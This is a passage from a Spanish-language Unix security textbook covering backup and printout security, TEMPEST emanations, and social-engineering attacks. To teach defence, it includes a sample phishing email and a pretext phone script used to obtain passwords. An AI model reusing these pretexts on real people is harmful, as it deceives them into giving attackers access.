a pensar, igual que para un administrador es f&#x00E1;cil encontrar el backup deseado tambi&#x00E9;n lo es
para un intruso que consiga acceso a las cintas, por lo que si el acceso a las mismas no est&#x00E1;
bien restringido un atacante lo tiene f&#x00E1;cil para sustraer una cinta con toda nuestra informaci&#x00F3;n;
no necesita saltarse nuestro cortafuegos, conseguir una clave del sistema o chantajear a un
operador: nosotros mismos le estamos poniendo en bandeja toda nuestros datos. No obstante,

ahora nos debemos plantear la duda habitual: si no etiqueto las copias de seguridad, &#x00BF;c&#x00F3;mo
puedo elegir la que debo restaurar en un momento dado? Evidentemente, se necesita cierta
informaci&#x00F3;n en cada cinta para poder clasi&#xFB01;carlas, pero esa informaci&#x00F3;n nunca debe ser algo
que le facilite la tarea a un atacante; por ejemplo, se puede dise~nar cierta codi&#xFB01;caci&#x00F3;n que s&#x00F3;lo
conozcan las personas responsables de las copias de seguridad, de forma que cada cinta vaya
convenientemente etiquetada, pero sin conocer el c&#x00F3;digo sea dif&#x02CA;&#x0131;cil imaginar su contenido. Aunque
en un caso extremo el atacante puede llevarse todos nuestros backups para analizarlos uno a
uno, siempre es m&#x00E1;s dif&#x02CA;&#x0131;cil disimular una carretilla llena de cintas de 8mm que una peque~na
unidad guardada en un bolsillo. Y si a&#x00FA;n pensamos que alguien puede sustraer todas las copias,
simplemente tenemos que realizar backups cifrados&#x2026;y controlar m&#x00E1;s el acceso al lugar donde las
guardamos.
  </para></section><!--end subsection--><!--l. 657--><section 
role="subsection"><title><abbrev role="title-mark">2.3.3</abbrev><anchor 
   id="x1-390002.3.3"  ></anchor>Otros elementos</title>
<!--l. 658--><para>  En muchas ocasiones los responsables de seguridad de los sistemas tienen muy presente que la
informaci&#x00F3;n a proteger se encuentra en los equipos, en las copias de seguridad o circulando por la red (y por
lo tanto toman medidas para salvaguardar estos medios), pero olvidan que esa informaci&#x00F3;n tambi&#x00E9;n puede
encontrarse en lugares menos obvios, como listados de impresora, facturas telef&#x00F3;nicas o la propia
documentaci&#x00F3;n de una m&#x00E1;quina.
<!--br/-->
<!--br/-->Imaginemos una situaci&#x00F3;n muy t&#x02CA;&#x0131;pica en los sistemas Unix: un usuario, desde su terminal o el equipo de su
despacho, imprime en el servidor un documento de cien p&#x00E1;ginas, documento que ya de entrada
ning&#x00FA;n operador comprueba &#x2013; y quiz&#x00E1;s no pueda comprobar, ya que se puede comprometer la
privacidad del usuario &#x2013; pero que puede contener, disimuladamente, una copia de nuestro &#xFB01;chero
de contrase~nas. Cuando la impresi&#x00F3;n &#xFB01;naliza, el administrador lleva el documento fuera de
la sala de operaciones, pone como portada una hoja con los datos del usuario en la m&#x00E1;quina
(login perfectamente visible, nombre del &#xFB01;chero, hora en que se lanz&#x00F3;&#x2026;) y lo deja, junto a los
documentos que otros usuarios han imprimido &#x2013; y con los que se ha seguido la misma pol&#x02CA;&#x0131;tica &#x2013;
en una estanter&#x02CA;&#x0131;a perdida en un pasillo, lugar al que cualquier persona puede acceder con
total libertad y llevarse la impresi&#x00F3;n, leerla o simplemente curiosear las portadas de todos los
documentos. As&#x02CA;&#x0131;, de repente, a nadie se le escapan bastante problemas de seguridad derivados de
esta pol&#x02CA;&#x0131;tica: sin entrar en lo que un usuario pueda imprimir &#x2013; que repetimos, quiz&#x00E1;s no sea
legal, o al menos &#x00E9;tico, curiosear &#x2013;, cualquiera puede robar una copia de un proyecto o un
examen <anchor 
   id="x1-39001f5"  ></anchor><footnote><para>     Evidentemente, si alguien imprime un examen de esta forma, no tenemos un problema con nuestra pol&#x02CA;&#x0131;tica sino con
nuestros usuarios.</para></footnote>,
obtener informaci&#x00F3;n sobre nuestros sistemas de &#xFB01;cheros y las horas a las que los usuarios suelen trabajar, o
simplemente descubrir, simplemente pasando por delante de la estanter&#x02CA;&#x0131;a, diez o veinte nombres v&#x00E1;lidos de
usuario en nuestras m&#x00E1;quinas; todas estas informaciones pueden ser de gran utilidad para un atacante, que
por si fuera poco no tiene que hacer nada para obtenerlas, simplemente darse un paseo por el lugar donde
depositamos las impresiones. Esto, que a muchos les puede parecer una exageraci&#x00F3;n, no es ni m&#x00E1;s
ni menos la pol&#x02CA;&#x0131;tica que se sigue en muchas organizaciones hoy en d&#x02CA;&#x0131;a, e incluso en centros
de proceso de datos, donde a priori ha de haber una mayor concienciaci&#x00F3;n por la seguridad
inform&#x00E1;tica.
<!--br/-->
<!--br/-->Evidentemente, hay que tomar medidas contra estos problemas. En primer lugar, las impresoras, plotters,
faxes, teletipos, o cualquier dispositivo por el que pueda salir informaci&#x00F3;n de nuestro sistema ha de estar
situado en un lugar de acceso restringido; tambi&#x00E9;n es conveniente que sea de acceso restringido el lugar
donde los usuarios recogen los documentos que lanzan a estos dispositivos. Ser&#x02CA;&#x0131;a conveniente que un
usuario que recoge una copia se acredite como alguien autorizado a hacerlo, aunque quiz&#x00E1;s
esto puede ser imposible, o al menos muy dif&#x02CA;&#x0131;cil, en grandes sistemas (imaginemos que en
una m&#x00E1;quina con cinco mil usuarios obligamos a todo aqu&#x00E9;l que va a recoger una impresi&#x00F3;n a
identi&#xFB01;carse y comprobamos que la identi&#xFB01;caci&#x00F3;n es correcta antes de darle su documento&#x2026;con toda
seguridad necesitar&#x02CA;&#x0131;amos una persona encargada exclusivamente de este trabajo), siempre es
conveniente demostrar cierto grado de inter&#x00E9;s por el destino de lo que sale por nuestra impresora:
sin llegar a realizar un control f&#x00E9;rreo, si un atacante sabe que el acceso a los documentos est&#x00E1;
m&#x02CA;&#x0131;nimamente controlado se lo pensar&#x00E1; dos veces antes de intentar conseguir algo que otro usuario ha
imprimido.

<!--br/-->
<!--br/-->Elementos que tambi&#x00E9;n pueden ser aprovechados por un atacante para comprometer nuestra seguridad son
todos aquellos que revelen informaci&#x00F3;n de nuestros sistemas o del personal que los utiliza, como ciertos
manuales (proporcionan versiones de los sistemas operativos utilizados), facturas de tel&#x00E9;fono del centro
(pueden indicar los n&#x00FA;meros de nuestros m&#x00F3;dems) o agendas de operadores (revelan los tel&#x00E9;fonos de varios
usuarios, algo muy provechoso para alguien que intente efectuar ingenier&#x02CA;&#x0131;a social contra ellos). Aunque es
conveniente no destruir ni dejar a la vista de todo el mundo esta informaci&#x00F3;n, si queremos eliminarla no
podemos limitarnos a arrojar documentos a la papelera: en el cap&#x02CA;&#x0131;tulo siguiente hablaremos del
basureo, algo que aunque parezca sacado de pel&#x02CA;&#x0131;culas de esp&#x02CA;&#x0131;as realmente se utiliza contra todo
tipo de entornos. Es recomendable utilizar una trituradora de papel, dispositivo que di&#xFB01;culta
much&#x02CA;&#x0131;simo la reconstrucci&#x00F3;n y lectura de un documento destruido; por poco dinero podemos
conseguir uno de estos aparatos, que suele ser su&#xFB01;ciente para acabar con cantidades moderadas de
papel.
  </para></section><!--end subsection--></section><!--end section--><!--l. 726--><section 
role="section"><title><abbrev role="title-mark">2.4</abbrev><anchor 
   id="x1-400002.4"  ></anchor>Radiaciones electromagn&#x00E9;ticas</title>
<!--l. 727--><para>  Dentro del apartado  <ulink 
  url="#x1-370002.3.1"  ><!--ref: eavesdropping--></ulink> pod&#x02CA;&#x0131;amos haber hablado del acceso no autorizado a los datos a trav&#x00E9;s de
las radiaciones que el hardware emite; sin embargo, este es un tema que ha cobrado especial
importancia (especialmente en organismos militares) a ra&#x02CA;&#x0131;z del programa TEMPEST, un t&#x00E9;rmino
(Transient ElectroMagnetic Pulse Emanation STandard) que identi&#xFB01;ca una serie de est&#x00E1;ndares del
gobierno estadounidense para limitar las radiaciones el&#x00E9;ctricas y electromagn&#x00E9;ticas del equipamiento
electr&#x00F3;nico, desde estaciones de trabajo hasta cables de red, pasando por terminales, mainframes,
ratones&#x2026;
<!--br/-->
<!--br/-->La idea es sencilla: la corriente que circula por un conductor provoca un campo electromagn&#x00E9;tico alrededor
del conductor, campo que var&#x02CA;&#x0131;a de la misma forma que lo hace la intensidad de la corriente. Si situamos
otro conductor en ese campo, sobre &#x00E9;l se induce una se~nal que tambi&#x00E9;n var&#x02CA;&#x0131;a proporcionalmente a la
intensidad de la corriente inicial; de esta forma, cualquier dispositivo electr&#x00F3;nico (no s&#x00F3;lo el inform&#x00E1;tico) emite
cont&#x02CA;&#x0131;nuamente radiaciones a trav&#x00E9;s del aire o de conductores, radiaciones que con el equipo adecuado se
pueden captar y reproducir remotamente con la consiguiente amenaza a la seguridad que esto implica.
Conscientes de este problema &#x2013; obviamente las emisiones de una batidora no son peligrosas para la
seguridad, pero s&#x02CA;&#x0131; que lo pueden ser las de un dipositivo de cifrado o las de un teclado desde el que se
env&#x02CA;&#x0131;en mensajes con&#xFB01;denciales &#x2013; en la d&#x00E9;cada de los 50 el gobierno de Estados Unidos introdujo una serie
de est&#x00E1;ndares para reducir estas radiaciones en los equipos destinados a almacenar, procesar o
transmitir informaci&#x00F3;n que pudiera comprometer la seguridad nacional. De esta forma, el hardware
certi&#xFB01;cado TEMPEST se suele usar con la informaci&#x00F3;n clasi&#xFB01;cada y con&#xFB01;dencial de algunos sistemas
gubernamentales para asegurar que el eavesdropping electromagn&#x00E9;tico no va a afectar a privacidad de los
datos.
<!--br/-->
<!--br/-->Casi medio siglo despu&#x00E9;s de las primeras investigaciones sobre emanaciones de este tipo, casi todos los
paises desarrollados y organizaciones militares internacionales tienen programas similares a TEMPEST con
el mismo &#xFB01;n: proteger informaci&#x00F3;n con&#xFB01;dencial. Para los gobiernos, esto es algo reservado a
informaciones militares, nunca a organizaciones &#x2018;normales&#x2019; y mucho menos a particulares (la NRO,
National Reconnaissance O&#xFB03;ce, elimin&#x00F3; en 1992 los est&#x00E1;ndares TEMPEST para dispositivos de uso
dom&#x00E9;stico); sin embargo, y como ejemplo &#x2013; algo extremo quiz&#x00E1;s &#x2013; de hasta que punto un potencial
atacante puede llegar a comprometer la informaci&#x00F3;n que circula por una red o que se lee en
un monitor, vamos a dar aqu&#x02CA;&#x0131; unas nociones generales sobre el problema de las radiaciones
electromagn&#x00E9;ticas.
<!--br/-->
<!--br/-->Existen numerosos tipos de se~nales electromagn&#x00E9;ticas; sin duda las m&#x00E1;s peligrosas son las de video y las de
transmisi&#x00F3;n serie, ya que por sus caracter&#x02CA;&#x0131;sticas no es dif&#x02CA;&#x0131;cil interceptarlas con el equipamiento adecuado
(<citation>[?]</citation> y <citation>[?]</citation>). Otras se~nales que a priori tambi&#x00E9;n son f&#x00E1;ciles de captar, como las de enlaces por radiofrecuencia o
las de redes basadas en infrarrojos, no presentan tantos problemas ya que desde un principio los
dise~nadores fueron conscientes de la facilidad de captaci&#x00F3;n y las amenazas a la seguridad que una captura
implica; esta inseguridad tan palpable provoc&#x00F3; la r&#x00E1;pida aparici&#x00F3;n de mecanismos implementados para
di&#xFB01;cultar el trabajo de un atacante, como el salto en frecuencias o el espectro disperso (<citation>[?]</citation>), o simplemente

el uso de protocolos cifrados. Este tipo de emisiones quedan fuera del alcance de TEMPEST, pero
son cubiertas por otro est&#x00E1;ndar denominado NONSTOP, tambi&#x00E9;n del Departamento de Defensa
estadounidense.
<!--br/-->
<!--br/-->Sin embargo, nadie suele tomar precauciones contra la radiaci&#x00F3;n que emite su monitor, su impresora o el
cable de su m&#x00F3;dem. Y son justamente las radiaciones de este hardware desprotegido las m&#x00E1;s preocupantes en
ciertos entornos, ya que lo &#x00FA;nico que un atacante necesita para recuperarlas es el equipo adecuado. Dicho
equipo puede variar desde esquemas extremadamente simples y baratos &#x2013; pero efectivos &#x2013; (<citation>[?]</citation>) hasta
complejos sistemas que en teor&#x02CA;&#x0131;a utilizan los servicios de inteligencia de algunos pa&#x02CA;&#x0131;ses. La
empresa Consumertronics (www.tsc-global.com) fabrica y vende diversos dispositivos de
monitorizaci&#x00F3;n, entre ellos el basado en <citation>[?]</citation>, que se puede considerar uno de los pioneros en el mundo
civil.
<!--br/-->
<!--br/-->Pero, &#x00BF;c&#x00F3;mo podemos protegernos contra el eavesdropping de las radiaciones electromagn&#x00E9;ticas de nuestro
hardware? Existe un amplio abanico de soluciones, desde simples medidas de prevenci&#x00F3;n hasta complejos &#x2013;
y caros &#x2013; sistemas para apantallar los equipos. La soluci&#x00F3;n m&#x00E1;s barata y simple que podemos aplicar es la
distancia: las se~nales que se transmiten por el espacio son atenuadas conforme aumenta la separaci&#x00F3;n de la
fuente, por lo que si de&#xFB01;nimos un per&#x02CA;&#x0131;metro f&#x02CA;&#x0131;sico de seguridad lo su&#xFB01;cientemente grande alrededor de una
m&#x00E1;quina, ser&#x00E1; dif&#x02CA;&#x0131;cil para un atacante interceptar desde lejos nuestras emisiones. No obstante, esto no es
aplicable a las se~nales inducidas a trav&#x00E9;s de conductores, que aunque tambi&#x00E9;n se atenuan por la
resistencia e inductancia del cableado, la p&#x00E9;rdida no es la su&#xFB01;ciente para considerar seguro el
sistema.
<!--br/-->
<!--br/-->Otra soluci&#x00F3;n consiste en la confusi&#x00F3;n: cuantas m&#x00E1;s se~nales existan en el mismo medio, m&#x00E1;s dif&#x02CA;&#x0131;cil ser&#x00E1; para un
atacante &#xFB01;ltrar la que est&#x00E1; buscando; aunque esta medida no hace imposible la interceptaci&#x00F3;n,
s&#x02CA;&#x0131; que la di&#xFB01;culta enormemente. Esto se puede conseguir simplemente manteniendo diversas
piezas emisoras (monitores, terminales, cables&#x2026;) cercanos entre s&#x02CA;&#x0131; y emitiendo cada una de ellas
informaci&#x00F3;n diferente (si todas emiten la misma, facilitamos el ataque ya que aumentamos
la intensidad de la se~nal inducida). Tambi&#x00E9;n existe hardware dise~nado expl&#x02CA;&#x0131;citamente para
crear ruido electromagn&#x00E9;tico, generalmente a trav&#x00E9;s de se~nales de radio que enmascaran las
radiaciones emitidas por el equipo a proteger; dependiendo de las frecuencias utilizadas, quiz&#x00E1;s
el uso de tales dispositivos pueda ser ilegal: en todos los paises el espectro electromagn&#x00E9;tico
est&#x00E1; dividido en bandas, cada una de las cuales se asigna a un determinado uso, y en muchas
de ellas se necesita una licencia especial para poder transmitir. En Espa~na estas licencias
son otorgadas por la Secretar&#x02CA;&#x0131;a General de Comunicaciones, dependiente del Ministerio de
Fomento.
<!--br/-->
<!--br/-->Por &#x00FA;ltimo, la soluci&#x00F3;n m&#x00E1;s efectiva, y m&#x00E1;s cara, consiste en el uso de dispositivos certi&#xFB01;cados que aseguran
m&#x02CA;&#x0131;nima emisi&#x00F3;n, as&#x02CA;&#x0131; como de instalaciones que apantallan las radiaciones. En el hardware hay dos
aproximaciones principales para prevenir las emisiones: una es la utilizaci&#x00F3;n de circuitos especiales que
apenas emiten radiaci&#x00F3;n (denominados de fuente eliminada, source suppressed), y la otra es la contenci&#x00F3;n de
las radiaciones, por ejemplo aumentando la atenuaci&#x00F3;n; generalmente ambas aproximaciones se aplican
conjuntamente (<citation>[?]</citation>). En cuanto a las instalaciones utilizadas para prevenir el eavesdropping, la idea general
es aplicar la contenci&#x00F3;n no s&#x00F3;lo a ciertos dispositivos, sino a un edi&#xFB01;cio o a una sala completa.
Quiz&#x00E1;s la soluci&#x00F3;n m&#x00E1;s utilizada son las jaulas de Faraday sobre lugares donde se trabaja con
informaci&#x00F3;n sensible; se trata de separar el espacio en dos zonas electromagn&#x00E9;ticamente aisladas (por
ejemplo, una sala y el resto del espacio) de forma que fuera de una zona no se puedan captar las
emisiones que se producen en su interior. Para implementar esta soluci&#x00F3;n se utilizan materiales
especiales, como algunas clases de cristal, o simplemente un recubrimiento conductor conectado a
tierra.
<!--br/-->
<!--br/-->Antes de &#xFB01;nalizar este punto quiz&#x00E1;s es recomendable volver a insistir en que todos los problemas y
soluciones derivados de las radiaciones electromagn&#x00E9;ticas no son aplicables a los entornos o empresas
normales, sino que est&#x00E1;n pensados para lugares donde se trabaja con informaci&#x00F3;n altamente con&#xFB01;dencial,
como ciertas empresas u organismos militares o de inteligencia. Aqu&#x02CA;&#x0131; simplemente se han presentado
como una introducci&#x00F3;n para mostrar hasta donde puede llegar la preocupaci&#x00F3;n por la seguridad
en esos lugares. La radiaci&#x00F3;n electromagn&#x00E9;tica no es un riesgo importante en la mayor&#x02CA;&#x0131;a de

organizaciones ya que suele tratarse de un ataque costoso en tiempo y dinero, de forma que un
atacante suele tener muchas otras puertas para intentar comprometer el sistema de una forma m&#x00E1;s
f&#x00E1;cil.


</para><!--l. 1--><para>

  </para></section><!--end section--></section><!--end chapter--><!--l. 1--><section 
role="chapter"><title><anchor 
   id="x1-410003"  ></anchor>Administradores, usuarios y personal</title>
  <!--l. 2--><section 
role="section"><title><abbrev role="title-mark">3.1</abbrev><anchor 
   id="x1-420003.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 3--><para>  Con frecuencia se suele a&#xFB01;rmar, y no es una exageraci&#x00F3;n (<citation>[?]</citation>), que el punto m&#x00E1;s d&#x00E9;bil de cualquier sistema
inform&#x00E1;tico son las personas relacionadas en mayor o menor medida con &#x00E9;l; desde un administrador sin una
preparaci&#x00F3;n adecuada o sin la su&#xFB01;ciente experiencia, hasta un guardia de seguridad que ni siquiera tiene
acceso l&#x00F3;gico al sistema, pero que deja acceder a todo el mundo a la sala de operaciones, pasando por
supuesto por la gran mayor&#x02CA;&#x0131;a de usuarios, que no suelen conscientes de que la seguridad tambi&#x00E9;n les
concierne a ellos. Frente a cada uno de estos grupos (administradores, usuarios y personal
externo al sistema) un potencial atacante va a comportarse de una forma determinada para
conseguir lograr sus objetivos, y sobre cada uno de ellos ha de aplicarse una pol&#x02CA;&#x0131;tica de seguridad
diferente: obviamente podemos exigir a un administrador de sistemas unos conocimientos m&#x00E1;s o
menos profundos de temas relacionados con la seguridad inform&#x00E1;tica, pero esos conocimientos
han de ser diferentes para el guardia de seguridad (sus conocimientos ser&#x02CA;&#x0131;an referentes a la
seguridad f&#x02CA;&#x0131;sica del entorno), y se convierten en simples nociones b&#x00E1;sicas si se trata de un usuario
medio.
<!--br/-->
<!--br/-->Hasta ahora hemos hablado de posibles ataques relacionados con el personal de un sistema inform&#x00E1;tico; sin
embargo, existen otras amenazas a la seguridad provenientes de ese personal que no son necesariamente
ataques en un sentido estricto de la palabra; en muchos casos no son intencionados, se podr&#x02CA;&#x0131;an catalogar
como accidentes, pero el que la amenaza no sea intencionada no implica que no se deba evitar: decir &#x2018;no lo
hice a prop&#x00F3;sito&#x2019; no va ayudar para nada a recuperar unos datos perdidos. En una sala de operaciones, las
personas realizan acciones sobre los sistemas bas&#x00E1;ndose &#x2013; en muchos casos &#x2013; &#x00FA;nicamente en su
apreciaci&#x00F3;n personal de lo que est&#x00E1; sucediendo; en esas circunstancias, dichas acciones pueden ser
sorprendentes y devastadoras, incluso si provienen de los mejores y m&#x00E1;s cuidadosos administradores
(<citation>[?]</citation>).
  </para></section><!--end section--><!--l. 32--><section 
role="section"><title><abbrev role="title-mark">3.2</abbrev><anchor 
   id="x1-430003.2"  ></anchor>Ataques potenciales</title>
<!--l. 33--><para>
  </para><!--l. 33--><section 
role="subsection"><title><abbrev role="title-mark">3.2.1</abbrev><anchor 
   id="x1-440003.2.1"  ></anchor>Ingenier&#x02CA;&#x0131;a social</title>
<!--l. 34--><para>  La ingenier&#x02CA;&#x0131;a social consiste en la manipulaci&#x00F3;n de las personas para que voluntariamente realicen actos
que normalmente no har&#x02CA;&#x0131;an (<citation>[?]</citation>); aunque a nadie le gusta ser manipulado, en algunos casos no
es excesivamente perjudicial (por ejemplo un vendedor puede aplicar ingenier&#x02CA;&#x0131;a social para
conocer las necesidades de un cliente y ofrecer as&#x02CA;&#x0131; mejor sus productos), si las intenciones de
quien la pone en pr&#x00E1;ctica no son buenas se convierte quiz&#x00E1;s el m&#x00E9;todo de ataque m&#x00E1;s sencillo,
menos peligroso para el atacante y por desgracia en uno de los m&#x00E1;s efectivos. Ese atacante
puede aprovechar el desconocimiento de unas m&#x02CA;&#x0131;nimas medidas de seguridad por parte de
personas relacionadas de una u otra forma con el sistema para poder enga~narlas en bene&#xFB01;cio
propio. Por ejemplo, imaginemos que un usuario de una m&#x00E1;quina Unix recibe el siguiente correo
electr&#x00F3;nico:

     </para><literallayout role="verbatim">
&#x00A0;From:&#x00A0;Super-User&#x00A0;&#x003C;root@sistema.com&#x003E;
&#x00A0;To:&#x00A0;Usuario&#x00A0;&#x003C;user@sistema.com&#x003E;
&#x00A0;Subject:&#x00A0;Cambio&#x00A0;de&#x00A0;clave
&#x00A0;Hola,
&#x00A0;Para&#x00A0;realizar&#x00A0;una&#x00A0;serie&#x00A0;de&#x00A0;pruebas&#x00A0;orientadas&#x00A0;a&#x00A0;conseguir&#x00A0;un&#x00A0;optimo
&#x00A0;funcionamiento&#x00A0;de&#x00A0;nuestro&#x00A0;sistema,&#x00A0;es&#x00A0;necesario&#x00A0;que&#x00A0;cambie&#x00A0;su&#x00A0;clave&#x00A0;mediante
&#x00A0;la&#x00A0;orden&#x00A0;&#x2019;passwd&#x2019;.&#x00A0;Hasta&#x00A0;que&#x00A0;reciba&#x00A0;un&#x00A0;nuevo&#x00A0;aviso&#x00A0;(aproximadamente&#x00A0;en&#x00A0;una
&#x00A0;semana),&#x00A0;por&#x00A0;favor,&#x00A0;asigne&#x00A0;a&#x00A0;su&#x00A0;contrasenya&#x00A0;el&#x00A0;valor&#x00A0;&#x2019;PEPITO&#x2019;&#x00A0;(en
&#x00A0;mayusculas).
&#x00A0;Rogamos&#x00A0;disculpe&#x00A0;las&#x00A0;molestias.&#x00A0;Saludos,
&#x00A0;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Administrador
</literallayout>
<!--l. 63--><para>Si el usuario no sabe nada sobre seguridad, es muy probable que siga al pie de la letra las indicaciones de
este e-mail; pero nadie le asegura que el correo no haya sido enviado por un atacante &#x2013; es muy f&#x00E1;cil
camu&#xFB02;ar el origen real de un mensaje &#x2013;, que consigue as&#x02CA;&#x0131; un acceso al sistema: no tiene m&#x00E1;s que enviar
un simple correo, sin complicarse buscando fallos en los sistemas operativos o la red, para
poner en juego toda la seguridad. Sin saberlo, y encima pensando que lo hace por el bien
com&#x00FA;n, el usuario est&#x00E1; ayudando al pirata a romper todo el esquema de seguridad de nuestra
m&#x00E1;quina.
<!--br/-->
<!--br/-->Pero no siempre el atacante se aprovecha de la buena fe de los usuarios para lograr
sus prop&#x00F3;sitos; tampoco es extra~no que intente enga~nar al propio administrador del
sistema <anchor 
   id="x1-44001f1"  ></anchor><footnote><para>     Esto simplemente es para dar m&#x00E1;s credibilidad, pero no es necesario que el usuario real no haya conectado en mucho
tiempo.</para></footnote>.
Por ejemplo, imaginemos que la m&#x00E1;quina tiene el puerto &#xFB01;nger abierto, y el atacante detecta un nombre de
usuario que nunca ha conectado al sistema; en este caso, una simple llamada telef&#x00F3;nica puede bastarle para
conseguir el acceso:
     </para><!--l. 81--><para><informalequation><graphic 
fileref="unixsec15x.gif"></graphic></informalequation>Administrador<informalequation><graphic 
fileref="unixsec16x.gif"></graphic></informalequation>  Buenos dias, aqu&#x02CA;&#x0131; &#x00E1;rea de sistemas, en qu&#x00E9; podemos
     <!--br/-->ayudarle?
     <!--br/--><informalequation><graphic 
fileref="unixsec17x.gif"></graphic></informalequation>Atacante<informalequation><graphic 
fileref="unixsec18x.gif"></graphic></informalequation>  Hola, soy Jos&#x00E9; Luis P&#x00E9;rez, llamaba porque no consigo
     <!--br/-->recordar mi password en la m&#x00E1;quina sistema.upv.es.
     <!--br/--><informalequation><graphic 
fileref="unixsec19x.gif"></graphic></informalequation>Administrador<informalequation><graphic 
fileref="unixsec20x.gif"></graphic></informalequation>  Un momento, me puede decir su nombre de usuario?
     <!--br/--><informalequation><graphic 
fileref="unixsec21x.gif"></graphic></informalequation>Atacante<informalequation><graphic 
fileref="unixsec22x.gif"></graphic></informalequation>  S&#x02CA;&#x0131;, claro, es jlperez.
     <!--br/--><informalequation><graphic 
fileref="unixsec23x.gif"></graphic></informalequation>Administrador<informalequation><graphic 
fileref="unixsec24x.gif"></graphic></informalequation>  Muy bien, la nueva contrase~na que acabo de asignarle
     <!--br/-->es rudolf. Por favor, nada m&#x00E1;s conectar, no olvide cambiarla.
     <!--br/--><informalequation><graphic 
fileref="unixsec25x.gif"></graphic></informalequation>Atacante<informalequation><graphic 
fileref="unixsec26x.gif"></graphic></informalequation>  Por supuesto. Muchas gracias, ha sido muy amable.
     <!--br/--><informalequation><graphic 
fileref="unixsec27x.gif"></graphic></informalequation>Administrador<informalequation><graphic 
fileref="unixsec28x.gif"></graphic></informalequation>  De nada, un saludo.
</para><!--l. 94--><para>Como podemos ver, estamos en la situaci&#x00F3;n opuesta a la anterior: ahora es el root quien facilita la
entrada del atacante en la m&#x00E1;quina; lo &#x00FA;nico que este ha necesitado es un nombre de usuario
v&#x00E1;lido.
<!--br/-->
<!--br/-->Evidentemente, cualquier mensaje, llamada telef&#x00F3;nica o similar que un usuario reciba debe ser puesto
inmediatamente en conocimiento del administrador del sistema; hay que recordar a los usuarios que en
ning&#x00FA;n caso se necesita su contrase~na para realizar tareas administrativas en la m&#x00E1;quina. De la misma forma,
si es el administrador quien directamente recibe algo parecido a lo que acabamos de ver, quiz&#x00E1;s sea
conveniente noti&#xFB01;car el hecho a los responsables de la organizaci&#x00F3;n, y por supuesto poner la
m&#x00E1;xima atenci&#x00F3;n en la seguridad de los sistemas involucrados, ya que en este caso se sabe a
ciencia cierta que alguien intenta comprometer nuestra seguridad; en <citation>[?]</citation> y <citation>[?]</citation> se muestran

algunas de las reglas b&#x00E1;sicas que debemos seguir en nuestra organizaci&#x00F3;n para prevenir ataques
de ingenier&#x02CA;&#x0131;a social y tambi&#x00E9;n para, en el caso de que se produzcan, reducir al m&#x02CA;&#x0131;nimo sus
efectos.
  </para></section><!--end subsection--><!--l. 111--><section 
role="subsection"><title><abbrev role="title-mark">3.2.2</abbrev><anchor 
   id="x1-450003.2.2"  ></anchor>Shoulder Sur&#xFB01;ng</title>
<!--l. 112--><para>  Otro tipo de ataque relacionado con la ingenuidad de los usuarios del sistema (pero tambi&#x00E9;n con el
control de acceso f&#x02CA;&#x0131;sico) es el denominado shoulder sur&#xFB01;ng. Consiste en &#x2018;espiar&#x2019; f&#x02CA;&#x0131;sicamente a los usuarios,
para obtener generalmente claves de acceso al sistema. Por ejemplo, una medida que lamentablemente
utilizan muchos usuarios para recordar sus contrase~nas es apuntarlas en un papel pegado al monitor
de su PC o escribirlas en la parte de abajo del teclado; cualquiera que pase por delante del
puesto de trabajo, sin problemas puede leer el login, password e incluso el nombre de m&#x00E1;quina a
la que pertenecen. Esto, que nos puede parecer una gran tonter&#x02CA;&#x0131;a, por desgracia no lo es, y
se utiliza m&#x00E1;s de lo que muchos administradores o responsables de seguridad piensan; y no
s&#x00F3;lo en entornos &#x2018;privados&#x2019; o con un control de acceso restringido, como pueda ser una sala
de operaciones de un centro de c&#x00E1;lculo, sino en lugares a los que cualquiera puede llegar sin
ninguna acreditaci&#x00F3;n: personalmente, hace unos a~nos pude leer claramente &#x2018;post-it&#x2019; pegados a los
monitores de los PCs utilizados por el personal de informaci&#x00F3;n de unos grandes almacenes de
Valencia, en los que aparec&#x02CA;&#x0131;an el nombre de usuario, la clave y el tel&#x00E9;fono de varios sistemas de la
empresa; cualquiera que se acercase al mostrador pod&#x02CA;&#x0131;a leer y memorizar esta informaci&#x00F3;n sin
problemas.
<!--br/-->
<!--br/-->El shoulder sur&#xFB01;ng no siempre se ve bene&#xFB01;ciado por la ingenuidad de los simples usuarios de un equipo; en
determinadas ocasiones son los propios programadores (gente que te&#x00F3;ricamente ha de saber algo m&#x00E1;s sobre
seguridad que el personal de administraci&#x00F3;n o de atenci&#x00F3;n al p&#x00FA;blico) los que dise~nan aplicaciones muy
susceptibles de sufrir ataques de este tipo. Por ejemplo, en ciertas aplicaciones &#x2013; especialmente algunas que
se ejecutan sobre MS Windows, y que son m&#x00E1;s o menos antiguas &#x2013; muestran claramente en
pantalla las contrase~nas al ser tecleadas. Cualquiera situado cerca de una persona que las est&#x00E1;
utilizando puede leer claramente esa clave; un perfecto ejemplo de lo que NO se debe hacer
nunca.
  </para></section><!--end subsection--><!--l. 143--><section 
role="subsection"><title><abbrev role="title-mark">3.2.3</abbrev><anchor 
   id="x1-460003.2.3"  ></anchor>Masquerading</title>
<!--l. 144--><para>  El ataque denominado de masquerading o mascarada consiste simplemente en suplantar la identidad de
cierto usuario autorizado de un sistema inform&#x00E1;tico o su entorno; esta suplantaci&#x00F3;n puede realizarse
electr&#x00F3;nicamente &#x2013; un usuario utiliza para acceder a una m&#x00E1;quina un login y password que no le pertenecen &#x2013;
o en persona. En este punto hablaremos brevemente de este &#x00FA;ltimo caso, la suplantaci&#x00F3;n en persona, un
ataque relativo tanto a la seguridad f&#x02CA;&#x0131;sica del entorno de operaciones como a la seguridad del
personal.
<!--br/-->
<!--br/-->La mascarada no es un ataque habitual en entornos normales; en estos, o bien existen &#x00E1;reas de acceso
semip&#x00FA;blico, donde un atacante no tiene que hacer nada especial para conseguir acceso &#x2013; y por tanto no
cabe hablar de masquerading &#x2013; o bien &#x00E1;reas de acceso restringido pero controlado por el propio personal de
la organizaci&#x00F3;n, como despachos o laboratorios. En este caso un ataque v&#x02CA;&#x0131;a mascarada no suele ser efectivo,
ya que es muy f&#x00E1;cil detectar al intruso (otro tema ser&#x02CA;&#x0131;a si realmente se toma alguna medida al detectarlo o
